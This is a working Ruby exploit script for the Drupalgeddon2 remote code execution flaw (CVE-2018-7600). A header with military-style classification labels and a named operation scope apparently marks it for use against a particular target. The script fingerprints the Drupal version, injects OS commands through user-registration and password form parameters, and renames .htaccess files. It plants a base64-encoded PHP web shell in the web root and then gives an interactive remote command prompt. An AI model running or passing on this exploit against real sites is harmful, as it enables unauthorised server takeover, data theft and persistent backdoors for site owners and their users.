#!/usr/bin/env ruby
#
# 🛡️ C4ISR-STRATCOM: SIGINT-V5
# [CLASSIFIED]: CONFIDENCIAL
# [SCOPE]: OPD HCG (CONV-0221-JAL-HCG-2026)
# [TACTIC]: TA0001_Initial_Access
# [TECHNIQUE]: T1190_STRATCOM_PAYLOAD_Public_Facing_App
#
# [CVE-2018-7600] Drupal <= 8.5.0 / <= 8.4.5 / <= 8.3.8 / 7.23 <= 7.57 - 'Drupalgeddon2' (SA-CORE-2018-002) ~ https://github.com/dreadlocked/Drupalgeddon2/
#
# Authors:
# - Hans Topo ~ https://github.com/dreadlocked // https://twitter.com/_dreadlocked
# - g0tmi1k   ~ https://blog.g0tmi1k.com/ // https://twitter.com/g0tmi1k
#

require 'base64'
require 'json'
require 'net/http'
require 'openssl'
require 'readline'
require 'highline/import'

# Settings - Try to write a PHP to the web root?
try_phpshell = true
# Settings - General/Stealth
$useragent = "drupalgeddon2"
webshell = "shell.php"
# Settings - Proxy information (nil to disable)
$proxy_addr = nil
$proxy_port = 8080

# Settings - Payload (we could just be happy without this PHP shell, by using just the OS shell - but this is 'better'!)
bashcmd = "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }"
bashcmd = "echo " + Base64.strict_encode64(bashcmd) + " | base64 -d"

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

# Function http_request <url> [type] [data]
def http_request(url, type="get", payload="", cookie="")
  puts verbose("HTTP - URL : #{url}") if $verbose
  puts verbose("HTTP - Type: #{type}") if $verbose
  puts verbose("HTTP - Data: #{payload}") if not payload.empty? and $verbose

  begin
    uri = URI(url)
    request = type =~ /get/? Net::HTTP::Get.new(uri.request_uri) : Net::HTTP::Post.new(uri.request_uri)
    request.initialize_http_header({"User-Agent" => $useragent})
    request.initialize_http_header("Cookie" => cookie) if not cookie.empty?
    request.body = payload if not payload.empty?
    return $http.request(request)
  rescue SocketError
    puts error("Network connectivity issue")
  rescue Errno::ECONNREFUSED => e
    puts error("The target is down ~ #{e.message}")
    puts error("Maybe try disabling the proxy (#{$proxy_addr}:#{$proxy_port})...") if $proxy_addr
  rescue Timeout::Error => e
    puts error("The target timed out ~ #{e.message}")
  end

  # If we got here, something went wrong.
  exit
end

# Function gen_evil_url <cmd> [method] [shell] [phpfunction]
def gen_evil_url(evil, element="", shell=false, phpfunction="passthru")
  puts info("Payload: #{evil}") if not shell
  puts verbose("Element    : #{element}") if not shell and not element.empty? and $verbose
  puts verbose("PHP fn     : #{phpfunction}") if not shell and $verbose

  # Vulnerable parameters: #access_callback / #lazy_builder / #pre_render / #post_render
  # Check the version to match the payload
  if $drupalverion.start_with?("8") and element == "mail"
    # Method #1 - Drupal v8.x: mail, #post_render - HTTP 200
    url = $target + $clean_url + $form + "?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpfunction + "&mail[a][#type]=markup&mail[a][#markup]=" + evil

  elsif $drupalverion.start_with?("8") and element == "timezone"
    # Method #2 - Drupal v8.x: timezone, #lazy_builder - HTTP 500 if phpfunction=exec // HTTP 200 if phpfunction=passthru
    url = $target + $clean_url + $form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=" + phpfunction + "&timezone[a][#lazy_builder][][]=" + evil

  elsif $drupalverion.start_with?("7") and element == "name"
    # Method #3 - Drupal v7.x: name, #post_render - HTTP 200
    url = $target + "#{$clean_url}#{$form}&name[%23post_render][]=" + phpfunction + "&name[%23type]=markup&name[%23markup]=" + evil
    payload = "form_id=user_pass&_triggering_element_name=name"
  end

  # Drupal v7.x needs an extra value from a form
  if $drupalverion.start_with?("7")
    response = http_request(url, "post", payload, $session_cookie)

    form_name = "form_build_id"
    puts verbose("Form name  : #{form_name}") if $verbose

    form_value = response.body.match(/input type="hidden" name="#{form_name}" value="(.*)"/).to_s.slice(/value="(.*)"/, 1).to_s.strip
    puts warning("WARNING: Didn't detect #{form_name}") if form_value.empty?
    puts verbose("Form value : #{form_value}") if $verbose

    url = $target + "#{$clean_url}file/ajax/name/%23value/" + form_value
    payload = "#{form_name}=#{form_value}"
  end

  return url, payload
end

# Function clean_result <input>
def clean_result(input)
  clean = input.to_s.strip
  clean.slice!(/\[{"command":".*}\]$/)
  clean.slice!(/The website encountered an unexpected error.*/)
  return clean
end

# Feedback functions
def success(text); "\e[#{32}m[+]\e[0m #{text}"; end
def error(text); "\e[#{31}m[-]\e[0m #{text}"; end
def warning(text); "\e[#{33}m[!]\e[0m #{text}"; end
def action(text); "\e[#{34}m[*]\e[0m #{text}"; end
def info(text); "\e[#{94}m[i]\e[0m #{text}"; end
def verbose(text); "\e[#{90}m[v]\e[0m #{text}"; end

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

def init_authentication()
  $uname = ask('Enter your username:  ') { |q| q.echo = false }
  $passwd = ask('Enter your password:  ') { |q| q.echo = false }
  $uname_field = ask('Enter the name of the username form field:  ') { |q| q.echo = true }
  $passwd_field = ask('Enter the name of the password form field:  ') { |q| q.echo = true }
  $login_path = ask('Enter your login path (e.g., user/login):  ') { |q| q.echo = true }
  $creds_suffix = ask('Enter the suffix eventually required after the credentials in the login HTTP POST request (e.g., &form_id=...):  ') { |q| q.echo = true }
end

def is_arg(args, param)
  args.each { |arg| return true if arg == param }
  return false
end

def usage()
  puts 'Usage: ruby drupalgeddon2.rb <target> [--authentication] [--verbose]'
  puts 'Example for target that does not require authentication:'
  puts '       ruby drupalgeddon2.rb https://example.com'
  puts 'Example for target that does require authentication:'
  puts '       ruby drupalgeddon2.rb https://example.com --authentication'
end

# Read in values
if ARGV.empty?
  usage()
  exit
end

$target = ARGV[0]
init_authentication() if is_arg(ARGV, '--authentication')
$verbose = is_arg(ARGV, '--verbose')

$target = "http://#{$target}" if not $target.start_with?("http")
$target += "/" if not $target.end_with?("/")

# Banner
puts action("--==[::#Drupalgeddon2::]==--")
puts "-"*80
puts info("Target : #{$target}")
puts info("Proxy  : #{$proxy_addr}:#{$proxy_port}") if $proxy_addr
puts info("Write? : Skipping writing PHP web shell") if not try_phpshell
puts "-"*80

# Setup connection
uri = URI($target)
$http = Net::HTTP.new(uri.host, uri.port, $proxy_addr, $proxy_port)
if uri.scheme == "https"
  $http.use_ssl = true
  $http.verify_mode = OpenSSL::SSL::VERIFY_NONE
end

$session_cookie = ''
if $uname
  $payload = $uname_field + '=' + $uname + '&' + $passwd_field + '=' + $passwd + $creds_suffix
  response = http_request($target + $login_path, 'post', $payload, $session_cookie)
  if (response.code == '200' or response.code == '303') and not response.body.empty? and response['set-cookie']
    $session_cookie = response['set-cookie'].split('; ')[0]
    puts success("Logged in - Session Cookie : #{$session_cookie}")
  end
end

# Try and get version
$drupalverion = ""
url = [
  $target + "CHANGELOG.txt",
  $target + "core/CHANGELOG.txt",
  $target + "includes/bootstrap.inc",
  $target + "core/includes/bootstrap.inc",
  $target + "includes/database.inc",
  $target,
]

url.each do|uri|
  response = http_request(uri, 'get', '', $session_cookie)
  if response['X-Generator'] and $drupalverion.empty?
    header = response['X-Generator'].slice(/Drupal (.*) \(https:\/\/www.drupal.org\)/, 1).to_s.strip
    if not header.empty?
      $drupalverion = "#{header}.x" if $drupalverion.empty?
      puts success("Header : v#{header} [X-Generator]")
    end
  end

  if response.code == "200"
    if uri.match(/CHANGELOG.txt/)
      $drupalverion = response.body.match(/Drupal (.*),/).to_s.slice(/Drupal (.*),/, 1).to_s.strip
      $drupalverion = "" if not $drupalverion[-1] =~ /\d/
    end
    if not response.body.empty?
      meta = response.body.match(/<meta name="Generator" content="Drupal (.*) /)
      metatag = meta.to_s.slice(/meta name="Generator" content="Drupal (.*) \(http/, 1).to_s.strip
      if not metatag.empty?
        $drupalverion = "#{metatag}.x" if $drupalverion.empty?
        puts success("Metatag: v#{$drupalverion} [Generator]")
      end
    end
    break if not $drupalverion.end_with?("x") and not $drupalverion.empty?
  end

  if response.code == "403" and $drupalverion.empty?
    $drupalverion = uri.match(/includes\/database.inc/)? "7.x/6.x" : "" if $drupalverion.empty?
    $drupalverion = uri.match(/core/)? "8.x" : "" if $drupalverion.empty?
    puts success("URL    : v#{$drupalverion}?") if not $drupalverion.empty?
  end
end

if not $drupalverion.empty?
  status = $drupalverion.end_with?("x")? "?" : "!"
  puts success("Drupal#{status}: v#{$drupalverion}")
else
  puts error("Didn't detect Drupal version")
  exit
end

if not $drupalverion.start_with?("8") and not $drupalverion.start_with?("7")
  puts error("Unsupported Drupal version (#{$drupalverion})")
  exit
end
puts "-"*80

$form = $drupalverion.start_with?("8")? "user/register" : "user/password"
url = "#{$target}?q=#{$form}"
puts action("Testing: Form   (#{$form})")
response = http_request(url, 'get', '', $session_cookie)
if response.code == "200" and not response.body.empty?
  puts success("Result : Form valid")
else
  puts error("Target is NOT exploitable (HTTP Response: #{response.code})")
  exit
end
puts "- "*40

$clean_url = $drupalverion.start_with?("8")? "" : "?q="
url = "#{$target}#{$form}"
puts action("Testing: Clean URLs")
response = http_request(url, 'get', '', $session_cookie)
if response.code == "200" and not response.body.empty?
  puts success("Result : Clean URLs enabled")
else
  $clean_url = "?q="
  puts warning("Result : Clean URLs disabled (HTTP Response: #{response.code})")
  if $drupalverion.start_with?("8")
    puts error("Required for Drupal v8.x")
    exit
  end
end
puts "-"*80

elementsv8 = ["mail", "timezone"]
elementsv7 = ["name"]
elements = $drupalverion.start_with?("8") ? elementsv8 : elementsv7

elements.each do|e|
  $element = e
  puts action("Testing: Code Execution   (Method: #{$element})")
  random = (0...8).map { (65 + rand(26)).chr }.join
  url, payload = gen_evil_url("echo #{random}", e)
  response = http_request(url, "post", payload, $session_cookie)
  if (response.code == "200" or response.code == "500") and not response.body.empty?
    result = clean_result(response.body)
    if result.include? random
      puts success("Target seems to be exploitable!")
      break
    end
  end
end
puts "-"*80

paths = ["", "sites/default/", "sites/default/files/"]
paths.each do|path|
  puts action("Testing: Writing To Web Root   (#{path.empty? ? "./" : path})")
  webshellpath = "#{path}#{webshell}"
  cmd = "#{bashcmd} | tee #{webshellpath}"
  if path == "sites/default/files/"
    cmd = "mv -f #{path}.htaccess #{path}.htaccess-bak; #{cmd}"
  end
  url, payload = gen_evil_url(cmd, $element)
  response = http_request(url, "post", payload, $session_cookie)
  if response.code == "200"
    response = http_request("#{$target}#{webshellpath}", "post", "c=hostname", $session_cookie)
    if response.code == "200"
      puts success("Very Good News Everyone! Wrote to the web root!")
      break
    end
  end
  webshellpath = ""
end if try_phpshell

if not webshellpath.empty?
  prompt = response.body.to_s.strip
  puts "-"*80
  puts info("Fake PHP shell:   curl '#{$target}#{webshellpath}' -d 'c=hostname'")
else
  puts action("Dropping back to direct OS commands")
end

trap("INT", "SIG_IGN")
loop do
  command = Readline.readline("#{prompt}>> ", true).to_s
  break if command == "exit"
  next if command.empty?
  if not webshellpath.empty?
    result = http_request("#{$target}#{webshellpath}", "post", "c=#{command}", $session_cookie).body
  else
    url, payload = gen_evil_url(command, $element, true)
    response = http_request(url, "post", payload, $session_cookie)
    result = clean_result(response.body) if not response.body.empty?
  end
  puts result
end
